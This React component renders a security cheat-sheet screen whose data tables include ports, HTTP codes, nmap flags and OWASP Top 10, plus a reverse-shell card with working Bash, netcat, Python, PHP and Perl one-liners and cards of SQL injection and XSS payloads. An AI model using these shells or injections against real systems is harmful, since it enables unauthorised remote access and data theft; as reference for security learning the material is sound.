import { useState, useMemo, useEffect } from 'react';
import { 
  HelpCircle, BookOpen, FileText, Eye, CloudLightning, Link,
  TerminalSquare, Hash, MonitorDot, Link2, MonitorDown, FileBadge,
  FileCode2, Globe2, X, Search, ChevronRight, ArrowLeft, Shield, Database
} from 'lucide-react';
import { motion } from 'motion/react';

interface ResourceDef {
  id: string;
  name: string;
  category: 'Cheat Sheets' | 'Networking' | 'Reference' | 'Web';
  icon: any;
  content: {
    title: string;
    subtitle: string;
    columns: string[];
    rows: string[][];
    summaryText?: string;
  };
}

const getResourceCategoryStyles = (category: string) => {
  switch (category) {
    case 'Cheat Sheets':
      return {
        borderClass: 'border-purple-500/20 hover:border-purple-400/60',
        iconBg: 'bg-gradient-to-br from-purple-500/20 via-[#3b0764] to-[#1e1b4b] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-purple-400/30 border-x-purple-500/20 border-b-black text-purple-200 group-hover:text-white',
        btnBg: 'bg-gradient-to-b from-[#0e0a16] to-[#0a0510] hover:bg-gradient-to-b hover:from-[#130b20] hover:to-[#0a0510] hover:shadow-[0_0_20px_rgba(168,85,247,0.15)]',
        accentText: 'text-purple-400 group-hover:text-purple-300',
        line: 'bg-purple-400',
        badge: 'text-purple-300 bg-purple-900/50 border-purple-500/30 shadow-[0_0_8px_rgba(168,85,247,0.4)]'
      };
    case 'Networking':
      return {
        borderClass: 'border-cyan-500/20 hover:border-cyan-400/60',
        iconBg: 'bg-gradient-to-br from-cyan-500/20 via-[#083344] to-[#042f2e] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-cyan-400/30 border-x-cyan-500/20 border-b-black text-cyan-200 group-hover:text-white',
        btnBg: 'bg-gradient-to-b from-[#061218] to-[#030a0d] hover:bg-gradient-to-b hover:from-[#091b24] hover:to-[#030a0d] hover:shadow-[0_0_20px_rgba(34,211,238,0.15)]',
        accentText: 'text-cyan-400 group-hover:text-cyan-300',
        line: 'bg-cyan-400',
        badge: 'text-cyan-300 bg-cyan-900/50 border-cyan-500/30 shadow-[0_0_8px_rgba(34,211,238,0.4)]'
      };
    case 'Web':
      return {
        borderClass: 'border-emerald-500/20 hover:border-emerald-400/60',
        iconBg: 'bg-gradient-to-br from-emerald-500/20 via-[#064e3b] to-[#062f2e] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-emerald-400/30 border-x-emerald-500/20 border-b-black text-emerald-200 group-hover:text-white',
        btnBg: 'bg-gradient-to-b from-[#05110a] to-[#030a06] hover:bg-gradient-to-b hover:from-[#081a0f] hover:to-[#030a06] hover:shadow-[0_0_20px_rgba(16,185,129,0.15)]',
        accentText: 'text-emerald-400 group-hover:text-emerald-300',
        line: 'bg-emerald-400',
        badge: 'text-emerald-300 bg-emerald-900/50 border-emerald-500/30 shadow-[0_0_8px_rgba(16,185,129,0.4)]'
      };
    case 'Reference':
    default:
      return {
        borderClass: 'border-teal-500/20 hover:border-teal-400/60',
        iconBg: 'bg-gradient-to-br from-teal-500/20 via-[#042f2e] to-[#022c22] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-teal-400/30 border-x-teal-500/20 border-b-black text-teal-200 group-hover:text-white',
        btnBg: 'bg-gradient-to-b from-[#081b16] to-[#040e0b] hover:bg-gradient-to-b hover:from-[#0b2921] hover:to-[#040e0b] hover:shadow-[0_0_20px_rgba(20,184,166,0.15)]',
        accentText: 'text-teal-400 group-hover:text-teal-300',
        line: 'bg-teal-400',
        badge: 'text-teal-300 bg-teal-900/50 border-teal-500/30 shadow-[0_0_8px_rgba(20,184,166,0.4)]'
      };
  }
};

export function Resources() {
  const [selectedResId, setSelectedResId] = useState<string | null>(null);
  // Handle hardware back button for Resource details
  useEffect(() => {
    const handlePopState = (e: PopStateEvent) => {
      // If we go back and there's no res state, but we had a res open, close it
      if (selectedResId && (!e.state || e.state.view !== 'resource')) {
        setSelectedResId(null);
      }
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [selectedResId]);

  const handleSelectRes = (id: string) => {
    setSelectedResId(id);
    window.history.pushState({ view: 'resource', id }, '');
  };

  const handleCloseRes = () => {
    setSelectedResId(null);
    if (window.history.state?.view === 'resource') {
      window.history.back();
    }
  };

  const resources: ResourceDef[] = [
    { 
      id: 'rev_shells', 
      name: 'Reverse Shell Payloads', 
      category: 'Cheat Sheets', 
      icon: TerminalSquare,
      content: {
        title: 'Common Reverse Shell Commands',
        subtitle: 'Payloads for establishing reverse connections',
        columns: ['LANGUAGE', 'COMMAND / PAYLOAD', 'DESCRIPTION'],
        rows: [
          ['Bash', 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1', 'Standard Bash reverse shell (requires /dev/tcp)'],
          ['Netcat', 'nc -e /bin/sh 10.0.0.1 4242', 'Classic netcat shell (if -e is supported)'],
          ['Netcat (OpenBSD)', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f', 'Netcat without -e flag support'],
          ['Python', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'', 'Reliable Python reverse shell with PTY'],
          ['PHP', 'php -r \'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'', 'Useful for web application exploits'],
          ['Perl', 'perl -e \'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', 'Perl-based reverse shell']
        ],
        summaryText: "Note: Replace '10.0.0.1' and '4242' with your listening IP and port respectively."
      }
    },
    { 
      id: 'sqli', 
      name: 'SQLi Payloads', 
      category: 'Web', 
      icon: Database,
      content: {
        title: 'SQL Injection Cheat Sheet',
        subtitle: 'Common SQL injection payloads and techniques',
        columns: ['TECHNIQUE', 'PAYLOAD', 'DESCRIPTION'],
        rows: [
          ['Auth Bypass', '\' or 1=1--', 'Classic authentication bypass'],
          ['Auth Bypass', '\' or \'1\'=\'1', 'Standard string-based bypass'],
          ['Union Based', '\' UNION SELECT null, null, null--', 'Determine number of columns'],
          ['Version (MySQL)', '\' UNION SELECT @@version, null--', 'Extracting database version'],
          ['Table Names', '\' UNION SELECT table_name,null FROM information_schema.tables--', 'Extracting table names'],
          ['Error Based', '\' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--', 'Triggering error for extraction']
        ],
        summaryText: "Always verify the database type, as syntax varies slightly between MySQL, PostgreSQL, MSSQL, etc."
      }
    },
    { 
      id: 'xss', 
      name: 'XSS Payloads', 
      category: 'Web', 
      icon: Globe2,
      content: {
        title: 'Cross-Site Scripting Vectors',
        subtitle: 'Standard payloads for triggering JavaScript execution',
        columns: ['CONTEXT', 'PAYLOAD', 'DESCRIPTION'],
        rows: [
          ['Basic', '<script>alert(1)</script>', 'Standard script tag execution'],
          ['Image Onload', '<img src="x" onerror="alert(1)">', 'Execution via broken image source attribute'],
          ['Body Onload', '<body onload="alert(1)">', 'Execution when the DOM body loads'],
          ['SVG Vector', '<svg onload="alert(1)">', 'Execution using SVG onload event'],
          ['Iframe', '<iframe src="javascript:alert(1)">', 'Execution via iframe source injection'],
          ['Link Javascript', '<a href="javascript:alert(1)">Click</a>', 'Execution via user click interaction']
        ],
        summaryText: "XSS can be used for session hijacking, defacement, and phishing payload delivery."
      }
    },
    { 
      id: 'ports', 
      name: 'Common TCP/UDP Ports', 
      category: 'Networking', 
      icon: MonitorDot,
      content: {
        title: 'TCP/UDP Port Registry Directory',
        subtitle: 'Standard Well-Known Network Ports Allocation',
        columns: ['PORT', 'PROTOCOL', 'KEY SERVICE & TYPICAL VECTOR'],
        rows: [
          ['21', 'TCP', 'FTP (File Transfer Protocol) - Vulnerable to packet sniffing'],
          ['22', 'TCP', 'SSH (Secure Terminal Access) - Encrypted key exchange access'],
          ['23', 'TCP', 'Telnet (Cleartext Access) - Deprecated, brute-force prone'],
          ['25', 'TCP', 'SMTP (Email Routing) - Critical SPAM & bounce vectors'],
          ['53', 'UDP', 'DNS (Domain Name Service) - Domain mappings, zone leaks'],
          ['80', 'TCP', 'HTTP (Web Traffic) - Cleartext unencrypted connections'],
          ['110', 'TCP', 'POP3 (Mail Client Fetching) - Cleartext password access'],
          ['161', 'UDP', 'SNMP (Router Diagnostics) - Community strings scans'],
          ['443', 'TCP', 'HTTPS (Secure TLS Web) - Mandatory for modern safety'],
          ['445', 'TCP', 'SMB (Windows Active Sharing) - Target of MS17-010 leaks'],
          ['3306', 'TCP', 'MySQL (Relational Database) - Target of SQLi & cred scans'],
          ['8080', 'TCP', 'HTTP Alternate - Often used in microservices & dev setups']
        ],
        summaryText: "Note: In cybersecurity audits, mapping port numbers to actual service responses is critical to trace host exposure risks."
      }
    },
    { 
      id: 'ascii', 
      name: 'ASCII Code Matrix', 
      category: 'Reference', 
      icon: FileText,
      content: {
        title: 'ASCII Control Matrix & Character Set',
        subtitle: 'Numeric representation of text elements',
        columns: ['DEC', 'HEX', 'BIN', 'CHARACTER', 'DESCRIPTION'],
        rows: [
          ['32', '20', '00100000', '[SPC]', 'Whitespace / Standard Space'],
          ['33', '21', '00100001', '!', 'Exclamation Point'],
          ['36', '24', '00100100', '$', 'Dollar Currency Character'],
          ['43', '2B', '00101011', '+', 'Mathematical Plus operator'],
          ['48', '30', '00110000', '0', 'Numerical zero'],
          ['65', '41', '01000001', 'A', 'Capital Letter A'],
          ['97', '61', '01100001', 'a', 'Lowercase alphabet start'],
          ['123', '7B', '01111011', '{', 'Curved Opening Bracket'],
          ['126', '7E', '01111110', '~', 'Tilde Operator Accent']
        ],
        summaryText: "Computes base alignments for binary systems and memory address headers within compiler payloads."
      }
    },
    { 
      id: 'http_status', 
      name: 'HTTP Status Reference', 
      category: 'Reference', 
      icon: FileCode2,
      content: {
        title: 'Hypertext Protocol Status Codes Directory',
        subtitle: 'Returned Web Header Handshaking Keys',
        columns: ['CODE', 'CLASSIFICATION', 'SHORT SUMMARY & IMPACT'],
        rows: [
          ['200', 'SUCCESS', 'OK - Connection completed correctly and payload delivered.'],
          ['301', 'REDIRECTION', 'Moved Permanently - Ingress routed to a different URI.'],
          ['400', 'CLIENT ERROR', 'Bad Request - Web requests syntax is incorrect.'],
          ['401', 'AUTH EXCEPTION', 'Unauthorized - Handshake requires credential verification.'],
          ['403', 'AUTH ACCESS', 'Forbidden - User credentials lack host permissions.'],
          ['404', 'SYSTEM ERROR', 'Not Found - Targeted resource could not be found under server.'],
          ['500', 'SERVER ERROR', 'Internal Server Error - Internal error crashed active request.'],
          ['503', 'SERVICE EXCEPTION', 'Service Unavailable - Active node overloaded or offline.']
        ],
        summaryText: "Returned responses from API queries can indicate exposed security boundaries, misconfigurations, or database states."
      }
    },
    { 
      id: 'url_enc', 
      name: 'URL Encoding Reference', 
      category: 'Reference', 
      icon: FileCode2,
      content: {
        title: 'Web URI Hex Escape Codes Sheet',
        subtitle: 'Used for query parameters and safe headers encoding',
        columns: ['HEX ENCODING', 'RAW STRING INPUT', 'USAGES & EXPLANATIONS'],
        rows: [
          ['%20', '[SPACE]', 'Inserts standard whitespaces inside target inputs'],
          ['%21', '!', 'Renders exclamation point identifiers'],
          ['%23', '#', 'Indicates HTML element anchors, block headers'],
          ['%24', '$', 'Currency symbol representation in URLs'],
          ['%26', '&', 'URI query query string concatenator symbol'],
          ['%2B', '+', 'Used inside math encoding schemes'],
          ['%2F', '/', 'Primary website routing directory separator'],
          ['%3A', ':', 'Used for port assignments and protocol schemas'],
          ['%3D', '=', 'Matches specific key/value strings assignments'],
          ['%3F', '?', 'Starts URL GET attributes list arrays']
        ],
        summaryText: "Mandatory format when injection parameters must traverse proxy channels safely."
      }
    },
    { 
      id: 'tips', 
      name: 'Linux Terminal Cheatsheet', 
      category: 'Cheat Sheets', 
      icon: TerminalSquare,
      content: {
        title: 'Essential CLI Commands Directory',
        subtitle: 'Linux System Operator Cheat Sheet Reference',
        columns: ['COMMAND', 'ARGS SYNTX', 'DETAILED FUNCTION OUTCOMES'],
        rows: [
          ['ls', '-la', 'List directories showing permissions, size, hidden files'],
          ['chmod', '+x <file>', 'Give designated shell-script execute permissions'],
          ['ssh', 'user@host', 'Initialize encrypted CLI connection to remoters'],
          ['curl', '-I <url>', 'Fetch targeted web headers without pulling documents'],
          ['grep', '-rI "text" .', 'Recursively search directory text bypassing binaries'],
          ['ps', 'aux', 'List active system processes and execution owners'],
          ['ip', 'addr show', 'Print connected network adapters & local IPs'],
          ['systemctl', 'status ssh', 'Check remote admin daemon active states']
        ],
        summaryText: "Handy shortcuts for navigating command consoles on targeted remote terminals."
      }
    },
    { 
      id: 'protocols', 
      name: 'IP & Network Protocols', 
      category: 'Networking', 
      icon: Link2,
      content: {
        title: 'Network Transport Headers Protocol List',
        subtitle: 'Standard parameters describing packet exchanges',
        columns: ['CODE', 'ACRONYM', 'LAYER LEVEL', 'OPERATIONAL BRIEF'],
        rows: [
          ['IP', 'Internet Protocol', 'Network Layer (L3)', 'Unreliable host-to-host packet routing'],
          ['TCP', 'Transmission Control', 'Transport Layer (L4)', 'Reliable connection-oriented stateful packet stream'],
          ['UDP', 'User Datagram', 'Transport Layer (L4)', 'Fast stateless unacknowledged message broadcasts'],
          ['ICMP', 'Control Messages', 'Network Layer (L3)', 'Diagnostic checks, errors, standard terminal ping signals'],
          ['ARP', 'Address Resolution', 'Data Link (L2)', 'Maps hardware MAC codes to IP address arrays']
        ],
        summaryText: "Each protocol has unique packet structure headers which can be audited via network scanners."
      }
    },
    { 
      id: 'osi_model', 
      name: 'OSI Model Reference', 
      category: 'Networking', 
      icon: CloudLightning,
      content: {
        title: 'OSI 7-Layer Protocol Matrix',
        subtitle: 'Standardized network architecture layers',
        columns: ['LAYER', 'NAME / PROTOCOLS', 'SECURITY VECTORS & FUNCTION'],
        rows: [
          ['7', 'Application (HTTP, FTP, DNS)', 'Payload execution, app-level attacks (XSS, SQLi, CSRF)'],
          ['6', 'Presentation (SSL/TLS, JPEG)', 'Encryption flaws, evasion techniques, data mangling'],
          ['5', 'Session (RPC, NetBIOS)', 'Session hijacking, token manipulation, credential bruteforcing'],
          ['4', 'Transport (TCP, UDP)', 'Port scanning, SYN floods, DoS/DDoS vectors'],
          ['3', 'Network (IPv4, IPv6, ICMP)', 'IP spoofing, packet sniffing, route hijacking, ping sweeps'],
          ['2', 'Data Link (MAC, ARP, VLAN)', 'ARP spoofing, MAC cloning, VLAN hopping, rogue switches'],
          ['1', 'Physical (Cables, Radio)', 'Wiretapping, signal jamming, physical access, rogue APs']
        ],
        summaryText: "Understanding the OSI model helps pinpoint the operational layer of network vulnerabilities and defense mechanisms."
      }
    },
    { 
      id: 'nmap_flags', 
      name: 'Nmap Scanning Flags', 
      category: 'Cheat Sheets', 
      icon: Eye,
      content: {
        title: 'Network Mapper Diagnostics Cheatsheet',
        subtitle: 'Common reconnaissance and host discovery arguments',
        columns: ['FLAG', 'SCAN TYPE', 'DETAILED FUNCTION OUTCOMES'],
        rows: [
          ['-sS', 'TCP SYN Scan', 'Stealthy half-open scan, does not complete TCP handshake (requires root)'],
          ['-sT', 'TCP Connect Scan', 'Standard full connection scan, leaves logs on target systems'],
          ['-sU', 'UDP Scan', 'Probes UDP ports, often slow and requires reliable responses'],
          ['-sV', 'Service Version', 'Interrogates open ports to determine service and version info'],
          ['-O', 'OS Detection', 'Enables heuristic OS finger-printing based on packet responses'],
          ['-p-', 'All Ports', 'Scans all 65535 ports instead of default top 1000 ports'],
          ['-T4', 'Aggressive Timing', 'Speeds up scans by reducing timeouts (0=Paranoid to 5=Insane)'],
          ['-A', 'Aggressive Scan', 'Enables OS detection, version detection, scripts, and traceroute'],
          ['--script', 'NSE Scripts', 'Runs designated Nmap Scripting Engine categories (e.g., vuln, default)']
        ],
        summaryText: "Nmap is the foundational tool for mapping subnets, identifying live hosts, and profiling exposed services."
      }
    },
    { 
      id: 'owasp_top10', 
      name: 'OWASP Top 10 Vulns', 
      category: 'Reference', 
      icon: Shield,
      content: {
        title: 'Open Web Application Security Project',
        subtitle: 'Most critical web application security risks',
        columns: ['RANK', 'VULNERABILITY CATEGORY', 'DESCRIPTION & IMPACT'],
        rows: [
          ['A01', 'Broken Access Control', 'Users act outside intended permissions, leading to unauthorized data exposure'],
          ['A02', 'Cryptographic Failures', 'Weak crypto algorithms or key management exposing sensitive data in transit/rest'],
          ['A03', 'Injection (SQL, NoSQL, OS)', 'Untrusted data sent to an interpreter, enabling arbitrary command execution'],
          ['A04', 'Insecure Design', 'Flaws in application architecture and threat modeling lacking security controls'],
          ['A05', 'Security Misconfiguration', 'Default accounts, missing patches, verbose error messages exposing system details'],
          ['A06', 'Vulnerable Components', 'Using unpatched libraries, frameworks, or dependencies with known exploits'],
          ['A07', 'Auth Failures', 'Compromised passwords, session tokens, or flawed authentication mechanisms'],
          ['A08', 'Software/Data Integrity', 'Code and infrastructure lacking integrity verification (e.g., CI/CD pipelines)'],
          ['A09', 'Security Logging/Monitoring', 'Failure to log and alert on active breaches, prolonging attack dwell time'],
          ['A10', 'SSRF', 'Server-Side Request Forgery forcing backend servers to fetch arbitrary URLs']
        ],
        summaryText: "The OWASP Top 10 provides a standard awareness document for developers and security testing methodologies."
      }
    }
  ];

  // Perform search (now just returns all resources)
  const filteredResources = useMemo(() => {
    return resources;
  }, []);

  const activeRes = useMemo(() => {
    return resources.find(r => r.id === selectedResId) || null;
  }, [selectedResId]);

  return (
    <div className="flex-1 flex flex-col overflow-hidden bg-obsidian relative">
      {/* CRT overlay */}
      <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)+50%,rgba(0,0,0,0.25)+50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[size:100%_4px,6px_100%] z-10 opacity-30"></div>

      {/* Cheat Cards Grid lists */}
      <div className="flex-1 overflow-y-auto p-4 grid grid-cols-2 xs:grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-4 pb-28">
        {filteredResources.map((res, index) => {
          const Icon = res.icon;
          const styles = getResourceCategoryStyles(res.category);
          return (
            <motion.button
              key={res.id}
              onClick={() => handleSelectRes(res.id)}
              initial={{ opacity: 0, y: 12 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ type: "spring", stiffness: 260, damping: 20, delay: Math.min(index * 0.015, 0.2) }}
              whileHover={{ scale: 1.04 }}
              whileTap={{ scale: 0.97 }}
              className={`flex flex-col items-stretch text-left bg-[#0c0c0c]/90 border ${styles.borderClass} p-3.5 group aspect-square relative select-none transition-all duration-300 rounded-2xl cursor-pointer ${styles.btnBg}`}
            >
              <div className={`absolute top-2.5 right-2.5 px-1.5 py-0.5 rounded text-[7.5px] font-mono tracking-wider font-extrabold transition-colors border ${styles.badge}`}>
                {res.category.toUpperCase()}
              </div>

              <div className="flex-1 flex items-center justify-start mt-2">
                <div className={`p-2.5 ${styles.iconBg} border transition-all duration-300 rounded-xl shadow-inner`}>
                  <Icon size={36} strokeWidth={1.8} />
                </div>
              </div>

              <div className="mt-2.5 text-[11px] font-bold font-sans text-gray-200 group-hover:text-white line-clamp-2 leading-tight tracking-wide">
                {res.name}
              </div>
              <div className="mt-2 text-[8px] font-mono text-gray-400 group-hover:text-white flex items-center justify-between">
                <span className={`text-[7.5px] ${styles.accentText} font-bold tracking-wider`}>[OPEN SECURE ARCHIVE]</span>
                <ChevronRight size={10} className={`${styles.accentText}`} />
              </div>
            </motion.button>
          );
        })}
      </div>

      {/* Overlay Slide-out View Panel */}
      {activeRes && (
        <div className="absolute inset-0 bg-obsidian z-50 flex flex-col pt-14 pb-16 font-mono text-neon-green">
          {/* Header */}
          <div className="absolute top-0 left-0 right-0 h-14 bg-dark-gray border-b border-teal-500 flex justify-between items-center px-4">
            <div className="flex items-center gap-2 text-teal-400 font-bold uppercase text-[10px] tracking-widest">
              <span>REFERENCE ARCHIVE // {activeRes.id.toUpperCase()}</span>
            </div>
            <button 
              onClick={handleCloseRes} 
              className="text-teal-400 hover:text-white hover:bg-teal-400/15 border border-teal-400/40 hover:border-teal-400 px-3 py-1.5 rounded-xl flex items-center gap-1.5 transition-all cursor-pointer text-xs font-mono font-bold uppercase active:scale-95"
            >
              <ArrowLeft size={14} className="stroke-[2.5px]" />
              <span>BACK</span>
            </button>
          </div>

          <div className="flex-1 overflow-y-auto p-4 flex flex-col justify-start">
            <div className="border border-teal-500/20 bg-[#0c0c0c]/90 p-5 flex-1 flex flex-col rounded-2xl shadow-xl">
              {/* Title descriptions */}
              <div className="mb-4 pb-2 border-b border-border-gray/50 shrink-0">
                <h2 className="text-xs font-extrabold uppercase text-white tracking-widest flex items-center gap-1.5">
                  <FileText size={14} className="text-teal-400" />
                  {activeRes.content.title}
                </h2>
                <p className="text-[10px] text-gray-400 uppercase mt-0.5">{activeRes.content.subtitle}</p>
              </div>

              {/* Data Table */}
              <div className="flex-1 overflow-hidden flex flex-col bg-black border border-border-gray text-[10px] sm:text-xs rounded-xl">
                {/* Columns Header - Hidden on mobile */}
                <div className="hidden sm:grid grid-cols-12 gap-2 bg-[#090909] border-b border-border-gray font-bold p-2 text-teal-400 shrink-0">
                  <span className="col-span-3 truncate">{activeRes.content.columns[0]}</span>
                  <span className="col-span-6 truncate">{activeRes.content.columns[1]}</span>
                  <span className="col-span-3 truncate">{activeRes.content.columns[2]}</span>
                </div>

                {/* Rows List */}
                <div className="flex-1 overflow-y-auto divide-y divide-border-gray/30">
                  {activeRes.content.rows.map((row, idx) => (
                    <div key={idx} className="flex flex-col sm:grid sm:grid-cols-12 gap-1 sm:gap-2 p-3 sm:p-2 hover:bg-[#070707] transition-colors leading-relaxed font-mono">
                      {/* Mobile Label + Value rendering */}
                      <div className="sm:col-span-3 flex flex-col sm:block">
                         <span className="sm:hidden text-teal-500/50 text-[8px] tracking-widest uppercase mb-0.5">{activeRes.content.columns[0]}</span>
                         <span className="text-white font-bold break-words">{row[0]}</span>
                      </div>
                      <div className="sm:col-span-6 flex flex-col sm:block overflow-x-auto sm:overflow-visible pb-1 sm:pb-0">
                         <span className="sm:hidden text-teal-500/50 text-[8px] tracking-widest uppercase mt-1 mb-0.5">{activeRes.content.columns[1]}</span>
                         <span className="text-teal-400/80 break-all sm:break-words whitespace-normal">{row[1]}</span>
                      </div>
                      <div className="sm:col-span-3 flex flex-col sm:block">
                         <span className="sm:hidden text-teal-500/50 text-[8px] tracking-widest uppercase mt-1 mb-0.5">{activeRes.content.columns[2]}</span>
                         <span className="text-gray-300 break-words">{row[2]}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {activeRes.content.summaryText && (
                <div className="mt-4 p-2.5 bg-[#051109] border border-[#0d2a13] text-[9px] text-[#00FF41]/80 max-w-full italic shrink-0 rounded-xl leading-tight">
                  {activeRes.content.summaryText}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
